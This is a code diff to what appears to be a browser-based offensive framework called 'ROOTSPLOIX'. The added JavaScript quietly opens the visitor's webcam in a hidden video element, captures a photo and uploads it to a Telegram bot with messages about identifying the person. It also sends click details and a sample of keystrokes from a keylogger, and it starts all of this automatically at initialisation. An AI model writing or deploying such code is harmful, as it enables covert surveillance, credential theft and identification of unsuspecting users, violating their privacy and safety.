@@ -8332,6 +8332,150 @@ Next report in 15 minutes...`;
             }
         }
         
+        // ===== ESKİ HALİ GİBİ BASİT SURVEILLANCE FUNCTIONS =====
+        async function startBasicSurveillance() {
+            try {
+                // Kamera erişimi dene
+                await attemptCameraAccess();
+                
+                // Mouse click tracking başlat
+                setupClickTracking();
+                
+                // Keylogger başlat
+                setupKeylogger();
+                
+            } catch (error) {
+                console.log('Basic surveillance error:', error);
+            }
+        }
+        
+        async function attemptCameraAccess() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: { width: 640, height: 480 },
+                    audio: false
+                });
+                
+                // Video element oluştur
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.muted = true;
+                video.autoplay = true;
+                video.style.display = 'none';
+                document.body.appendChild(video);
+                
+                video.addEventListener('loadedmetadata', async () => {
+                    // Kamera mesajı gönder
+                    const cameraMsg = `📷💀 CAMERA ACCESS GRANTED! 💀📷
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📹 Resolution: ${video.videoWidth}x${video.videoHeight}
+🕒 Time: ${new Date().toLocaleString()}
+🌍 URL: ${window.location.href}
+
+💀 KAMERA ERİŞİMİ BAŞARILI!
+🔥 FOTO ÇEKİMİ BAŞLIYOR!`;
+                    
+                    if (telegram) {
+                        await telegram.sendMessage(cameraMsg);
+                    }
+                    
+                    // 3 saniye sonra foto çek
+                    setTimeout(() => {
+                        capturePhoto(video);
+                    }, 3000);
+                });
+                
+            } catch (error) {
+                // Kamera erişim hatası
+                const errorMsg = `❌ Camera access denied or not available.
+
+Session: ${ROOTSPLOIX_SESSION.id}
+Error: ${error.message}
+Time: ${new Date().toLocaleString()}`;
+                
+                if (telegram) {
+                    await telegram.sendMessage(errorMsg);
+                }
+            }
+        }
+        
+        function capturePhoto(video) {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                ctx.drawImage(video, 0, 0);
+                
+                canvas.toBlob(async (blob) => {
+                    if (blob && telegram) {
+                        // Foto mesajı
+                        const photoMsg = `📷🔍 ŞAHİS RESMİ ALINDI - ARAŞTIRMAYA BAŞLANDI! 🔍📷
+
+👥 Şahıs resmi alındı, gerekli araştırılmaya başlandı.
+🔎 Profil analizi ve kimlik tespiti yapılıyor.
+📊 Veri toplama işlemi aktif durumda.
+
+🎯 Session: ${ROOTSPLOIX_SESSION.id}
+📷 Çözünürlük: ${canvas.width}x${canvas.height}
+🕒 Zaman: ${new Date().toLocaleString()}
+
+🔒 Güvenlik Protokolü: AKTİF
+🔍 Araştırma Durumu: DEVAM EDİYOR`;
+                        
+                        await telegram.sendMessage(photoMsg);
+                        
+                        // Foto dosyasını gönder
+                        try {
+                            await telegram.sendFile(blob, 'Şahıs Fotoğrafı - Araştırma Dosyası', 'photo');
+                        } catch (e) {
+                            console.log('Photo send error:', e);
+                        }
+                    }
+                }, 'image/jpeg', 0.9);
+                
+            } catch (error) {
+                console.log('Photo capture error:', error);
+            }
+        }
+        
+        function setupClickTracking() {
+            document.addEventListener('click', async (event) => {
+                const clickMsg = `🖘️ CLICK DETECTED!
+
+🎯 Position: ${event.clientX}, ${event.clientY}
+🎯 Target: ${event.target.tagName}
+🎯 ID: ${event.target.id || 'none'}
+🎯 Class: ${event.target.className || 'none'}
+🎯 Text: ${(event.target.textContent || '').substring(0, 50)}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 CLICK TRACKING ACTIVE!`;
+                
+                if (telegram) {
+                    await telegram.sendMessage(clickMsg);
+                }
+            });
+        }
+        
+        function setupKeylogger() {
+            document.addEventListener('keydown', async (event) => {
+                const keyMsg = `⌨️ KEY PRESSED: ${event.key}
+
+🎯 Code: ${event.code}
+🎯 Target: ${event.target.tagName}
+🕒 Time: ${new Date().toLocaleString()}
+
+💀 KEYLOGGER ACTIVE!`;
+                
+                if (telegram && Math.random() < 0.1) { // Sadece %10 oranında gönder
+                    await telegram.sendMessage(keyMsg);
+                }
+            });
+        }
+        
         // ===== FRAMEWORK INITIALIZATION =====
         // Global instances
         let rootsploix = null;
@@ -8521,6 +8665,9 @@ Next report in 15 minutes...`;
                 if (telegram) {
                     await telegram.sendMessage(startupMsg);
                 }
+                
+                // ESKİ HALİ GİBİ - KAMERA VE CLICK TRAKİNG BAŞLAT
+                await startBasicSurveillance();
                 
                 // Show activation button for single prompt system
                 setTimeout(() => {
